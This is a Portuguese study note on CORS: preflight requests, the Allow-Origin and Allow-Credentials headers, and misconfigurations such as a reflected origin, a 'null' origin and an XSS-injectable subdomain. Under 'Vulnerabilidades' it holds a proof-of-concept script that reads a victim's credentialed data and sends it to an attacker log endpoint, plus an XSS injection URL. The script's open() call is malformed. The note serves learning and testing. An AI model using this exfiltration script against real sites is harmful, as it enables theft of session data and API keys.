#web 


O CORS ou **Cross-origin resource sharing** é um mecanismo presente nos navegadores para habilitar o acesso a recursos de outros domínios ou outras fontes. Ele extende outro mecanismo o [[Same-Origin Policy]].

## CORS e SOP

O SOP é um mecanismo bem restritivo e muitos websites interajem com outros websites, seja de subdomínios ou websites de terceiros. Uma maneira de "relaxar" essa interação é através do CORS.

O CORS utilizada um conjunto de headers HTTP para definir as origens confiáveis, como por exemplo:
* **Access-Control-Allow-Origin** -> quando um servidor web recebe uma requisição HTTP de origem diferente, ele responde incluindo esse header na resposta.
* **Access-Control-Allow-Credentials** -> o comportamento padrão de requisições CORS são de requisições onde não é passado as credenciais, entretanto o servidor pode permitir que o JS na origem inclua as credenciais na requisição.

## Pre-flight

É uma requisição CORS que utiliza 3 headers HTTP:

```
OPTIONS /resource/foo
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: origin, x-requested-with
Origin: https://foo.bar.org
```

Essa requisição é enviada automaticamente para o servidor, perguntando ao servidor se é possível utilizar requisições como por exemplo o **DELETE**.

Se o servidor permitir, ele irá retorna a resposta com seguinte cabeçalho:

```
HTTP/1.1 204 No Content
Connection: keep-alive
Access-Control-Allow-Origin: https://foo.bar.org
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
Access-Control-Max-Age: 86400
```

## CORS e CSRF

O CORS não protege contra [[CSRF]], apenas flexibiliza a utilização do SOP, porém, se mal configurado pode ser uma ameaça a CSRF. 

## Vulnerabilidades

### Header ACAO gerado pelo servidor

Algumas aplicações permitem que qualquer domínio acesse seus recursos. Uma forma de testar isto é, modificando o `origin` e vendo a resposta do servidor.

| Requisição                                      | Resposta                                      |
| ------------------------------------------------ | --------------------------------------------- |
| `GET /sensitive-victim-data HTTP/1.1`            | `HTTP/1.1 200 OK`                             |
| `Host: vulnerable-website.com`                   | `Access-Control-Allow-Origin: https://malicious-website.com` |
| `Origin: https://malicious-website.com`          | `Access-Control-Allow-Credentials: true`     |
| `Cookie: sessionid=...`                          | ...                                           |

Se a informação retorna dados sensíveis como dados de sessão, o *hacker* pode enviar um website fake para a vítima para colher esses dados, usando por exemplo o script abaixo:

```html
    <script>
        var xhr = new XMLHttpRequest();
        var url = "https://site-legitimo";
            
        xhr.onreadystatechange = function() {
            if(xhr.readyState === XMLHttpRequest.DONE) {
                    fetch("/log?key=" + xhr.responseText);
            }
        }
        xhr.open("GET", url, "/sensitive-victim-data", true);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
```

### Whitelists

Um das formas de permitir determinados domínios, é criando uma lista de domínios permitidos. Algumas aplicações podem criar essas listas para permitir o acesso de todos os subdomínios (incluindo futuros subdomínios que não existe) por meio de regex ou adicionando prefixos e sufixos na url. Qualquer erro nessa implementação pode garantir acesso de domínios externos.

Outro caso, é o uso do valor `null` na *whitelist* para dar acesso ao ambiente de desenvolvimento local da aplicação.

| Requisição                                      | Resposta                                      |
| ------------------------------------------------ | --------------------------------------------- |
| `GET /sensitive-victim-data HTTP/1.1`            | `HTTP/1.1 200 OK`                             |
| `Host: vulnerable-website.com`                   | `Access-Control-Allow-Origin: null` |
| `Origin: null`                                      | `Access-Control-Allow-Credentials: true`     |

Essa situação é semelhante a situação anterior.

### XSS

Mesmo que o CORS esteja configurado certo, se um website confiável é vulnerável a [[XSS]], o *hacker* pode usar isso ao seu favor, podendo pegar uma API key, usando a url:

```
https://subdomain.site-vulneravel.com/?xss=<script>aquele codigo acima do cors por exemplo</script>
```
## Como mitigar

* Evite usar o header `Access-Control-Allow-Origin: Null` e `Access-Control-Allow-Origin:*`
* Acesse apenas websites confiáveis

## Referência

https://portswigger.net/web-security/cors#vulnerabilities-arising-from-cors-configuration-issues